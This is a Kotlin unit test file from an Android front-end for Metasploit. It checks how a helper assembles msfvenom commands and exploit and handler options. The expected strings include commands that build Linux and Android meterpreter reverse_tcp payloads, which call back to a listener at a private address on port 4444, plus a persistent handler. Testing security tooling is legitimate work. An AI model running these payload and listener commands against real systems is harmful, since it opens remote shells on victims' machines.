package org.fsploit.android.data.msf

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class MsfModuleCommandTest {

    @Test
    fun `venom command includes format and output when present`() {
        val command = MsfModuleCommand.composeVenomCommand(
            payload = "linux/x64/meterpreter/reverse_tcp",
            lhost = "192.168.1.50",
            lport = "4444",
            format = "elf",
            output = "/sdcard/p.elf"
        )

        assertEquals(
            "nh -r \"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o /sdcard/p.elf\"",
            command
        )
    }

    @Test
    fun `venom command omits blank format and output segments`() {
        val command = MsfModuleCommand.composeVenomCommand(
            payload = "android/meterpreter/reverse_tcp",
            lhost = "10.0.0.2",
            lport = "",
            format = "",
            output = ""
        )

        assertTrue(command.contains("-p android/meterpreter/reverse_tcp"))
        assertTrue(command.contains("LHOST=10.0.0.2"))
        assertFalse(command.contains(" -f "))
        assertFalse(command.contains(" -o "))
        assertFalse(command.contains("LPORT="))
    }

    @Test
    fun `exploit options drop blanks and type ports as ints`() {
        val options = MsfModuleCommand.buildExploitOptions(
            rhosts = "192.168.1.20",
            rport = "21",
            payload = "",
            lhost = "192.168.1.50",
            lport = "4444"
        )

        assertEquals("192.168.1.20", options["RHOSTS"])
        assertEquals(21, options["RPORT"])
        assertEquals(4444, options["LPORT"])
        assertEquals("192.168.1.50", options["LHOST"])
        assertFalse(options.containsKey("PAYLOAD"))
    }

    @Test
    fun `exploit options skip non-numeric ports`() {
        val options = MsfModuleCommand.buildExploitOptions(
            rhosts = "192.168.1.20",
            rport = "abc",
            payload = "x/y",
            lhost = "",
            lport = ""
        )

        assertFalse(options.containsKey("RPORT"))
        assertFalse(options.containsKey("LPORT"))
        assertFalse(options.containsKey("LHOST"))
        assertEquals("x/y", options["PAYLOAD"])
    }

    @Test
    fun `handler options always keep the listener alive`() {
        val options = MsfModuleCommand.buildHandlerOptions(
            payload = "linux/x64/meterpreter/reverse_tcp",
            lhost = "192.168.1.50",
            lport = "4444"
        )

        assertEquals(false, options["ExitOnSession"])
        assertEquals(4444, options["LPORT"])
    }
}
